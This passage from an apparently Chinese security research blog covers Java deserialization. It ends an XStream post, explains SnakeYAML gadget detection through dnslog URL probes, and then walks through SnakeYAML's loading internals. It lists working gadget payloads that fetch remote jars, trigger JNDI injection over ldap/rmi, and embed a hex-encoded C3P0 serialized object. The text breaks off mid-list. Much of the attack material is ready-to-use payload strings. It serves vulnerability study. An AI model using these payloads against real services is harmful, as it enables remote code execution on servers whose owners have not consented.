<span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="其他说明-1"><a href="#其他说明-1" class="headerlink" title="其他说明"></a>其他说明</h4><p>唯一与sorted-set有点区别的地方就是，在com.thoughtworks.xstream.converters.collections.TreeMapConverter#unmarshal，可以看到没有TreeSetConverter那么多的限制</p><p><img src="/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><p>在&lt;=1.3.1版本的当中</p><p>会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用</p><p>在1.4.7-1.4.9版本，ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/1543/#_1">https://paper.seebug.org/1543/#_1</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> XStream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYAML实现Gadget探测</title>
      <link href="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/"/>
      <url>/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SnakeYAML实现Gadget探测"><a href="#SnakeYAML实现Gadget探测" class="headerlink" title="SnakeYAML实现Gadget探测"></a>SnakeYAML实现Gadget探测</h1><center>@Y4tacker</center><h2 id="思路来源"><a href="#思路来源" class="headerlink" title="思路来源"></a>思路来源</h2><p>今天在学习SnakeYAML的反序列化的时候，想到一个新的探测payload，网上之前有一个SPI那个链子可以有通过URLClassloader检测 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!java.net.URL [null, \&quot;[http://osrwbf.dnslog.cn](http://osrwbf.dnslog.cn/)\&quot;]: 1&quot;</span>;</span><br></pre></td></tr></table></figure><p> 这个的话主要是因为SnakeYAML在解析带键值对的集合的时候会对键调用hashCode方法因此会触发DNS解析</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/1.png"></p><p>因此通过构造URL对象后面简单加个: 1让他成为一个mapping ，不过会触发多次，后面有个师傅具体更了下就直接放上来了</p><blockquote><p>不管是set还是map，都会对URL触发两次hashCode()</p><p>第一次触发点是相同的，都是SafeConstructor.flatterMapping()–&gt;SafeConstructor.processDuplicateKeys()</p><p>第二次触发点是不同的，分别是 BaseConstructor.constructSet2ndStep() 和 BaseConstructor.constructMapping2ndStep()</p></blockquote><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/2.png"></p><h2 id="实现探测Gadget"><a href="#实现探测Gadget" class="headerlink" title="实现探测Gadget"></a>实现探测Gadget</h2><h3 id="不完美的构造"><a href="#不完美的构造" class="headerlink" title="不完美的构造"></a>不完美的构造</h3><p>这里再补充个探测gadget思路：：在刚刚的思路上实现了探测gadget，如果string存在才会接着触发URLDNS，不存在就不会 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;key: [!!java.lang.String []: 0, !!java.net.URL [null, \&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\&quot;]: 1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>2016年1月，snakeyaml的Constructor.java提交了一个commit，把ConstructSequence#construct() 里面的node.getType().getConstructors()改成了node.getType().getDeclaredConstructors()。所以从1.17版本开始，这个才可以探测private构造函数的类了，详情见</p><p><a href="https://github.com/snakeyaml/snakeyaml/commit/d1df711e244323f2d05becb184863fd6333525cd">https://github.com/snakeyaml/snakeyaml/commit/d1df711e244323f2d05becb184863fd6333525cd</a></p><p>当然上面的payload又遇到了问题，如果对象的构造方法私有化就不行，为什么呢看下文</p><h3 id="更完善的方案"><a href="#更完善的方案" class="headerlink" title="更完善的方案"></a>更完善的方案</h3><p>影响版本：1.7-1.30目前最新</p><p>在1.7版本前的org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#createEmptyJavaBean不是通过反射因此也是不行</p><p>解决方案是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;key: [!!java.lang.String &#123;&#125;: 0, !!java.net.URL [null, \&quot;[http://5ydl3f.dnslog.cn](http://5ydl3f.dnslog.cn/)\&quot;]: 1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个与上面的区别不一样在于探测的类后面[]或{}对应的分别是ConstructSequence与ConstructMapping，光这样说还是不够清楚，就详细来说，可以看到<code>org.yaml.snakeyaml.constructor.Constructor.ConstructSequence#construct</code>的处理逻辑如下，我们只看最关键的地方</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/3.png"></p><p>可以看到这里获取构造函数调用的是<code>node.getType().getConstructors()</code>，也就是只会获得公有的构造函数，因此会出错</p><p>如果换成了<code>&#123;&#125;</code>则会调用<code>org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#construct</code></p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/4.png"></p><p>这里首先调用<code>createEmptyJavaBean</code>实例化对象，可以看到这里是getDeclaredConstructor就算是私有也Ok</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">createEmptyJavaBean</span><span class="params">(MappingNode node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    java.lang.reflect.Constructor&lt;?&gt; c = node.getType().getDeclaredConstructor();</span><br><span class="line">    c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> c.newInstance();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> YAMLException(var3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么你会好奇如果我想要调用带参数的构造函数怎么办，那肯定不行，那SnakeYAML如何处理的呢也就是后面调用了，<code>constructJavaBean2ndStep</code>，与本文探测问题无关，简单来说其实就是在while循环里不断通过反射设置值</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/5.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有时候细节也确实很重要，昨晚匆匆忙忙却忽略了很多细节，说起来也是惭愧</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SnakeYAML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYAML反序列化及可利用Gadget</title>
      <link href="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/"/>
      <url>/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SnakeYAML反序列化及可利用Gadget"><a href="#SnakeYAML反序列化及可利用Gadget" class="headerlink" title="SnakeYAML反序列化及可利用Gadget"></a>SnakeYAML反序列化及可利用Gadget</h1><h2 id="SnakeYaml简介"><a href="#SnakeYaml简介" class="headerlink" title="SnakeYaml简介"></a>SnakeYaml简介</h2><p>YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。</p><p>在Java中，有一个用于解析YAML格式的库，即SnakeYaml。</p><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。</p><p>当然在分析之前还得了解YAML的语法格式，具体可以百度看看，这里不放了</p><h2 id="使用SnakeYaml进行序列化和反序列化"><a href="#使用SnakeYaml进行序列化和反序列化" class="headerlink" title="使用SnakeYaml进行序列化和反序列化"></a>使用SnakeYaml进行序列化和反序列化</h2><p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。</p><ul><li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；</li><li>Yaml.dump()：将一个对象转化为yaml文件形式；</li></ul><p>Yaml.load()，经过我的测试当不存在某个属性，或者存在属性但是不是由public修饰的时候会调用set方法，这里不想放图了自己玩玩吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line"><span class="comment">//    static &#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(&quot;open -na Calculator&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line">    <span class="keyword">public</span> String tt;</span><br><span class="line">    String abc;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestBean</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setTest&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.test = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTt</span><span class="params">(String tt)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setTt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.tt = tt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAbc</span><span class="params">(String abc)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAbc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.abc = abc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">yaml.load(<span class="string">&quot;!!TestBean &#123;name: abc, test: aa, tt: jj, abc: def&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>至于为什么Public不能调用set方法，简单说一下在后面调用constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的目标对象的属性值，而这个Property的设置在org.yaml.snakeyaml.introspector.PropertyUtils#getPropertiesMap</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/1.png"></p><p>可以看到这个如果是Public修饰的话，后面会调用org.yaml.snakeyaml.introspector.FieldProperty#get，这个只是反射获取值</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/2.png"></p><p>而如果是MethodProperty.set()函数，则就是通过反射机制来调用目标类name属性的setter方法来进行属性值的设置</p><h2 id="SnakeYaml反序列化过程调试分析"><a href="#SnakeYaml反序列化过程调试分析" class="headerlink" title="SnakeYaml反序列化过程调试分析"></a>SnakeYaml反序列化过程调试分析</h2><p>当然既然SnakeYaml这个库也不认为反序列化一些类是漏洞那么我也不会去详细的了解每一步，至少感觉做到知道有这个类以后能够如何利用了</p><p>在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数：</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/3.png"></p><p>在loadFromReader()函数中，调用了BaseConstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型：</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/4.png"></p><p>跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果：</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/5.png"></p><p>在getClassForNode()函数中，先根据tag取出className为目标类，然后调用getClassForName()函数获取到具体的类：</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/6.png"></p><p>还有个小细节就是getClassForName可以初始化静态块里面的函数</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/7.png"></p><p>调用construct()函数实例化类对象</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/8.png"></p><p>进一步跟进constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的目标对象的属性值，这里上面已经提过了也就没啥好说的了，整个利用链也有了，分析完毕</p><h2 id="可利用的Gadget"><a href="#可利用的Gadget" class="headerlink" title="可利用的Gadget"></a>可利用的Gadget</h2><h3 id="1-利用SPI机制-基于ScriptEngineManager利用链"><a href="#1-利用SPI机制-基于ScriptEngineManager利用链" class="headerlink" title="1.利用SPI机制-基于ScriptEngineManager利用链"></a>1.利用SPI机制-基于ScriptEngineManager利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [<span class="string">&quot;http://127.0.0.1/a.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure><p>利用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">newInstance:<span class="number">396</span>, Class (java.lang)</span><br><span class="line">nextService:<span class="number">380</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">404</span>, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:<span class="number">480</span>, ServiceLoader$<span class="number">1</span> (java.util)</span><br><span class="line">initEngines:<span class="number">122</span>, ScriptEngineManager (javax.script)</span><br><span class="line">init:<span class="number">84</span>, ScriptEngineManager (javax.script)</span><br><span class="line">&lt;init&gt;:<span class="number">75</span>, ScriptEngineManager (javax.script)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">construct:<span class="number">557</span>, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:<span class="number">341</span>, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:<span class="number">182</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:<span class="number">141</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:<span class="number">127</span>, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:<span class="number">450</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:<span class="number">369</span>, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:<span class="number">10</span>, Demo (BasicKnow.SnakeymlUnser)</span><br></pre></td></tr></table></figure><h3 id="2-JdbcRowSetImpl"><a href="#2-JdbcRowSetImpl" class="headerlink" title="2.JdbcRowSetImpl"></a>2.JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;ldap://localhost:1389/Exploit\&quot;\n autoCommit: true&quot;</span>;</span><br></pre></td></tr></table></figure><p>当然也可以写成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;, autoCommit: true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们知道利用链是setDataSourceName-&gt;setAutoCommit，</p><p>可以看到修饰符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private String dataSource;</span><br></pre></td></tr></table></figure><p>因此可以触发，不多说了太简单了</p><h3 id="3-Spring-PropertyPathFactoryBean"><a href="#3-Spring-PropertyPathFactoryBean" class="headerlink" title="3.Spring PropertyPathFactoryBean"></a>3.Spring PropertyPathFactoryBean</h3><p>简单测试下能拿下整个版本到2.6.3最新版都行，不过也很好理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; targetBeanName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; propertyPath: y4tacker\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  shareableResources: [\&quot;rmi://127.0.0.1:1099/Exploit\&quot;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>或者一行拿下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &#123;targetBeanName: \&quot;rmi://127.0.0.1:1099/Exploit\&quot;, propertyPath: \&quot;y4tacker\&quot;, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;shareableResources: [\&quot;rmi://127.0.0.1:1099/Exploit\&quot;]&#125;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到在org.springframework.beans.factory.config.PropertyPathFactoryBean#setBeanFactory</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/9.png"></p><p>这里网上流传版本找到个org.springframework.jndi.support.SimpleJndiBeanFactory，其调用getBean的时候会触发JNDI注入，当然这里还有个限制是this.beanFactory.isSingleton(this.targetBeanName)</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/10.png"></p><p>也很好绕过设置shareableResources即可</p><h3 id="4-Apache-XBean"><a href="#4-Apache-XBean" class="headerlink" title="4.Apache XBean"></a>4.Apache XBean</h3><p>依赖，当然版本没限制</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;foo\&quot;,!!javax.naming.Reference [\&quot;foo\&quot;, \&quot;TouchFile\&quot;, \&quot;http://yourVps/\&quot;],!!org.apache.xbean.naming.context.WritableContext []]]&quot;</span>;</span><br></pre></td></tr></table></figure><p>原因在于org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding继承了Binding</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/11.png"></p><p>如果能触发其toString函数即可调用org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding#getObject，在调用到org.apache.xbean.naming.context.ContextUtil#resolve时</p><p>看到这个就不陌生了，太熟悉了，甚至不允许远程调用的时候也能尝试找ObjectFactory绕过</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/12.png"></p><h3 id="5-C3P0-JndiRefForwardingDataSource"><a href="#5-C3P0-JndiRefForwardingDataSource" class="headerlink" title="5.C3P0 JndiRefForwardingDataSource"></a>5.C3P0 JndiRefForwardingDataSource</h3><p>比较简单放个poc就行了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  jndiName: \&quot;rmi://localhost/Exploit\&quot;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  loginTimeout: 0&quot;</span>;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource  &#123;jndiName: \&quot;rmi://localhost/Exploit\&quot;,  loginTimeout: \&quot;0\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>不过还是简单说一下，com.mchange.v2.c3p0.JndiRefForwardingDataSource#setLoginTimeout</p><p>调用了this.inner()里面又调用了this.dereference()，最终触发JNDI注入</p><p><img src="/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/13.png"></p><h3 id="6-C3P0-WrapperConnectionPoolDataSource"><a href="#6-C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="6.C3P0 WrapperConnectionPoolDataSource"></a>6.C3P0 WrapperConnectionPoolDataSource</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String poc = <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\&quot;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单C3P0的二次反序列化payload，不多说了</p><h3 id="7-Apache-Commons-Configuration"><a href="#7-Apache-Commons-Configuration" class="headerlink" title="7.Apache Commons Configuration"></a>7.Apache Commons 